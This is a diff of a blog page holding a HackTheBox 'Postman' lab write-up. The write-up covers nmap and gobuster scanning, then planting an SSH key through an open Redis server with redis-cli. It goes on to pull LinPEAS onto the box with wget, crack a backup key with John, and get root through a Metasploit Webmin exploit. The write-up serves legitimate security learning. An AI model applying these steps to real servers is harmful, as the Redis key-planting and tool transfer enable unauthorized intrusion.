@@ -1,148 +1,97 @@
 <!DOCTYPE html>
-<html lang="en-us">
-
+<html>
 <head>
-  <title>HackTheBox Postman Write Up | Ajdin&#39;s blog about security and development</title>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBox Postman Write Up - AJDIN</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="HackTheBox Postman Write Up" />
+<meta property="og:description" content="This is a write up on how to gain root on HackTheBox Postman" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/htb/postman/" />
+<meta property="article:published_time" content="2020-03-13T13:28:11+02:00" />
+<meta property="article:modified_time" content="2020-03-13T13:28:11+02:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Postman Write Up"/>
+<meta name="twitter:description" content="This is a write up on how to gain root on HackTheBox Postman"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
 
-  <meta charset="UTF-8">
-  <meta name="language" content="en">
-  <meta name="description" content="This is a write up on how to gain root on HackTheBox Postman">
-  <meta name="keywords" content="">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/main.css" />
+	<link rel="stylesheet" type="text/css" href="http://example.org/css/custom.css" />
+	<link rel="stylesheet" type="text/css" href="http://example.org/css/dark.css"  />
+	<link rel="stylesheet" type="text/css" href="http://example.org/css/custom-dark.css"  />
 
-  
-  
-  <meta name="twitter:card" content="summary" />
-  <meta name="twitter:title" content="HackTheBox Postman Write Up" />
-  <meta name="twitter:description" content="This is a write up on how to gain root on HackTheBox Postman"/>
-  <meta name="twitter:site" content="@ajdintrejic" />
-  <meta name="twitter:creator" content="https://twitter.com/ajdintrejic" />
-  
-
-  <link rel="shortcut icon" type="image/png" href="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/237/water-wave_1f30a.png" />
-
-  
-  
-    
- 
-  
-  
-  
-  
-  
-  
-    
-    <link type="text/css" rel="stylesheet" href="/css/post.min.89fa77e4b9794341578ef456e6f2f0e8217abeb3b9cedd3c659ff7f5ba6c0c3d.css" integrity="sha256-ifp35Ll5Q0FXjvRW5vLw6CF6vrO5zt08ZZ/39bpsDD0="/>
-  
-    
-    <link type="text/css" rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
-  
-  
-   
-   
-    
-
-<script type="application/ld+json">
-  
-    { 
-      "@context": "http://schema.org", 
-      "@type": "WebSite", 
-      "url": "https:\/\/ajdin.io\/posts\/htb\/postman\/",
-      "name": "HackTheBox Postman Write Up",
-      "author": {
-        "@type": "Person",
-        "name": ""
-      },
-      "description": "This is a write up on how to gain root on HackTheBox Postman"
-    }
-  
-  </script>
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-165836726-1', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="http://example.org/js/main.js"></script>
+	<script src="http://example.org/js/abc.js"></script>
+	<script src="http://example.org/js/xyz.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
 </head>
 
 <body>
-  <div class="burger__container">
-  <div class="burger" aria-controls="navigation" aria-label="Menu">
-    <div class="burger__meat burger__meat--1"></div>
-    <div class="burger__meat burger__meat--2"></div>
-    <div class="burger__meat burger__meat--3"></div>
-  </div>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="http://example.org/">
+	<h1 class="site-title"><a href="http://example.org/">AJDIN</a></h1>
+	<div class="site-description"><h2>welcome to ajdin.io</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/ajdintrejic" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/ajdintrejic" title="Twitter"><i data-feather="twitter"></i></a><a href="mailto:ajdintrejic@protonmail.ch" title="Mail"><i data-feather="mail"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">Archive</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/categories">Categories</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
 </div>
- 
-
-  <nav class="nav" id="navigation">
-  <ul class="nav__list">
-    
-    
-      <li>
-        <a  href="/about">about</a>
-      </li>
-    
-      <li>
-        <a  href="/posts">blog</a>
-      </li>
-    
-      <li>
-        <a  href="/cv">cv</a>
-      </li>
-    
-      <li>
-        <a  href="/">home</a>
-      </li>
-    
-  </ul>
-</nav>
 
 
-  <main>
-    
-    
+		<div class="post-header">
+			<h1 class="title">HackTheBox Postman Write Up</h1>
+			<div class="meta">Posted at &mdash; Mar 13, 2020</div>
+		</div>
 
-    <div class="flex-wrapper">
-      <div class="post__container">
-        <div class="post">
-          <header class="post__header">
-            <h1 id="post__title">HackTheBox Postman Write Up</h1>
-            <time datetime="2020-03-13 13:28:11 &#43;0200 &#43;0200" class="post__date">Mar 13 2020</time> 
-          </header>
-          <article class="post__content">
-              
+		<div class="markdown">
+            
 <h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let’s run a quick nmap scan as always.</p>
-<pre><code class="language-bash"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160
-</code></pre>
-<p>Short explanation:</p>
-<pre><code>-sV Version detection
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
+</code></pre></div><p>Short explanation:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-sV Version detection
 -sC Script scan
 -O  Enable OS detection 
 -oA Output to all formats
-</code></pre>
-<p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
+</code></pre></div><p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
 <p>While I wait for this to be finished I’ll start a full nmap scan.</p>
-<pre><code class="language-bash"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160
-</code></pre>
-<p><img src="/htb/postman/nmap_initial.png" alt="nmap initial"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
+</code></pre></div><p><img src="/htb/postman/nmap_initial.png" alt="nmap initial"></p>
 <p>As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</p>
 <p><img src="/htb/postman/port80.png" alt="port80"></p>
 <p><img src="/htb/postman/port10000_1.png" alt="port80"></p>
 <p>Now on the second server I have to add a “s” to my http request so I can access that.</p>
 <p><img src="/htb/postman/port10000_2.png" alt="port80"></p>
 <p>I’ll also start up gobuster. On port 10000 every page link loads the same login so gobuster doesn’t help us there. Let’s run it on port 80.</p>
-<pre><code class="language-sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t 100
-</code></pre>
-<p><img src="/htb/postman/gobuster.png" alt="gobuster"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#ae81ff">100</span>
+</code></pre></div><p><img src="/htb/postman/gobuster.png" alt="gobuster"></p>
 <p>Now I felt kinda lost so I looked into what did the full nmap scan find.</p>
 <p><img src="/htb/postman/nmap_full.png" alt="nmap full"></p>
 <h2 id="getting-user-account">Getting user account<a class="anchor" href="#getting-user-account">#</a></h2>
@@ -152,174 +101,72 @@ if (!doNotTrack) {
 <p>The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”.</p>
 </blockquote>
 <p>So we’re on the right track. The developer guides us for the next steps on how to exploit this. Using <code>telnet</code> we can see now that we can connect to the machine easily:</p>
-<pre><code class="language-bash">$ telnet 10.10.10.160 6379
-</code></pre>
-<p>We don’t have a real shell here but we can write some files. We’ll write our own ssh keys. Let’s generate them.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#ae81ff">6379</span>
+</code></pre></div><p>We don’t have a real shell here but we can write some files. We’ll write our own ssh keys. Let’s generate them.</p>
 <p><img src="/htb/postman/ssh_keygen.png" alt="nmap full"></p>
 <p>We will push the key and pad it before and after. Why? Well we’ll push it to Redis memory and then flush the memory to a file. The memory will contain a lot of garbage and we’re hoping ssh will parse the file, ignore the garbage and correctly read our key.</p>
-<pre><code class="language-bash">$ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt
-</code></pre>
-<p>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using <code>redis-cli</code>:</p>
-<pre><code class="language-bash">$ redis-cli -h 10.10.10.160 flushall
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; foo.txt
+</code></pre></div><p>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using <code>redis-cli</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
 $ cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
-</code></pre>
-<p>Looks good. How to dump our memory content into the <code>authorized_keys</code> file? You can see what have I done in picture below.</p>
+</code></pre></div><p>Looks good. How to dump our memory content into the <code>authorized_keys</code> file? You can see what have I done in picture below.</p>
 <p><img src="/htb/postman/redis.png" alt="redis"></p>
 <p>Now that we’ve got a shell, we can see by running</p>
-<pre><code class="language-bash">$ cat /etc/passwd
-</code></pre>
-<p>that we have to gain access to Matt’s account.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
+</code></pre></div><p>that we have to gain access to Matt’s account.</p>
 <p>We can’t run anything as sudo and we don’t belong in any special groups. I searched the redis dir but there wasn’t anything we could work with, I went into <code>/var</code> and checked every folder and again, nothing we can work with. Let’s pull the big guns out. Big guns being LinPEAS. Let’s transfer them onto the server.</p>
 <p>Clone the repo to your machine, enter the <code>/linPEAS dir</code> and start an http server from there. I used port 1114.</p>
-<pre><code class="language-bash">$ sudo python -m SimpleHTTPServer 1114
-</code></pre>
-<p>Now, navigate to <code>/tmp</code> and create a dir there and cd into it (e.g. <code>/tmp/1234</code>), then grab the file from the machine.</p>
-<pre><code class="language-bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
-</code></pre>
-<p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#ae81ff">1114</span>
+</code></pre></div><p>Now, navigate to <code>/tmp</code> and create a dir there and cd into it (e.g. <code>/tmp/1234</code>), then grab the file from the machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
+</code></pre></div><p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
 <p><img src="/htb/postman/id_rsa_bak.png" alt="id rsa bak"></p>
 <h3 id="cracking-ssh-key-with-john">Cracking ssh key with John<a class="anchor" href="#cracking-ssh-key-with-john">#</a></h3>
 <p>Simply pipe this into ssh2john.py and crack it with the rockyou.txt wordlist.</p>
 <p><img src="/htb/postman/john.png" alt="john"></p>
 <p>I tried to ssh into the server with this key but no success. So I connected again as redis and ran</p>
-<pre><code class="language-bash">$ su Matt
-</code></pre>
-<p>And that’s how I got user</p>
-<pre><code class="language-bash">Matt@Postman:~$ cat user.txt 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
+</code></pre></div><p>And that’s how I got user</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
 517ad...
-</code></pre>
-<h2 id="getting-root">Getting root<a class="anchor" href="#getting-root">#</a></h2>
+</code></pre></div><h2 id="getting-root">Getting root<a class="anchor" href="#getting-root">#</a></h2>
 <p>Getting root is pretty easy, I just logged into webmin with <code>Matt</code> and <code>computer2008</code>. In there I couldn’t do anything, but we can see a notification that we have to update the software.</p>
 <h3 id="webmin-privilege-escalation">Webmin privilege escalation<a class="anchor" href="#webmin-privilege-escalation">#</a></h3>
 <p>I found an exploit on Metasploit and used it. Below are highlighted the options which are changed. Make sure to switch the payload as the default one didn’t work. I always have success in using the python one.</p>
-<pre><code class="language-bash"> &gt; show payloads
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
  &gt; set payload &lt;payload here&gt;
-</code></pre>
-<p><img src="/htb/postman/metasploit.png" alt="metasploit"></p>
+</code></pre></div><p><img src="/htb/postman/metasploit.png" alt="metasploit"></p>
 <p>After this you can simply type <code>exploit</code> and you should have a shell as root and you can <code>cat root.txt</code>.</p>
 
 
-              
-          </article>
-          
+		</div>
 
-<ul class="tags__list">
-    
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/redis/">redis</a>
-    </li>
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/john/">john</a>
-    </li>
-    <li class="tag__item">
-        <a class="tag__link" href="https://ajdin.io/tags/webmin/">webmin</a>
-    </li></ul>
-
- <div class="pagination">
-  
-    
-
-    
-      <a class="pagination__item" href="https://ajdin.io/posts/htb/mango/">
-        <span class="pagination__label">Next Post</span>
-        <span class="pagination__title" >HackTheBox Mango Write Up</a>
-      </a>
-    
-    
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/redis">redis</a></li>
+								
+								<li><a href="/tags/john">john</a></li>
+								
+								<li><a href="/tags/webmin">webmin</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © All rights reserved |  <a href="https://twitter.com/ajdintrejic">Ajdin Trejić</a></div>
+	</nav>
 </div>
 
-          
-          <footer class="post__footer">
-            
 
 
-<div class="social-icons">
-  
-     
-    
-      <a class="social-icons__link" title="Twitter"
-         href="https://twitter.com/ajdintrejic"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/twitter.svg')"></div>
-      </a>
-    
-  
-     
-    
-      <a class="social-icons__link" title="GitHub"
-         href="https://github.com/ajdintrejic"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/github.svg')"></div>
-      </a>
-    
-  
-     
-    
-      <a class="social-icons__link" title="Email"
-         href="mailto:ajdintrejic@protonmail.ch"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/email.svg')"></div>
-      </a>
-    
-  
-     
-    
-      <a class="social-icons__link" title="LinkedIn"
-         href="https://www.linkedin.com/in/ajdin-treji%C4%87-5103441b4/"
-         target="_blank" rel="noopener">
-        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/linkedin.svg')"></div>
-      </a>
-    
-     
-</div>
-
-            <p>© 2020</p>
-          </footer>
-          </div>
-      </div>
-      
-      <div class="toc-container">
-          
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#reconnaissance">Reconnaissance</a></li>
-    <li><a href="#getting-user-account">Getting user account</a>
-      <ul>
-        <li><a href="#redis-file-write">Redis file write</a></li>
-        <li><a href="#cracking-ssh-key-with-john">Cracking ssh key with John</a></li>
-      </ul>
-    </li>
-    <li><a href="#getting-root">Getting root</a>
-      <ul>
-        <li><a href="#webmin-privilege-escalation">Webmin privilege escalation</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-      </div>
-      
-    </div>
-    
-
-  </main>
-
-   
-
-  
-  <script src="/js/index.min.49e4d8a384357d9b445b87371863419937ede9fa77737522ffb633073aebfa44.js" integrity="sha256-SeTYo4Q1fZtEW4c3GGNBmTft6fp3c3Ui/7YzBzrr&#43;kQ=" crossorigin="anonymous"></script>
-  
-  
-  <script src="https://unpkg.com/prismjs@1.20.0/components/prism-core.min.js"></script>
-
-  
-  <script src="https://unpkg.com/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"
-    data-autoloader-path="https://unpkg.com/prismjs@1.20.0/components/"></script>
-
-  
-    <script src="/js/table-of-contents.js"></script>
-  
-
-
+<script>feather.replace()</script>
 </body>
-
 </html>
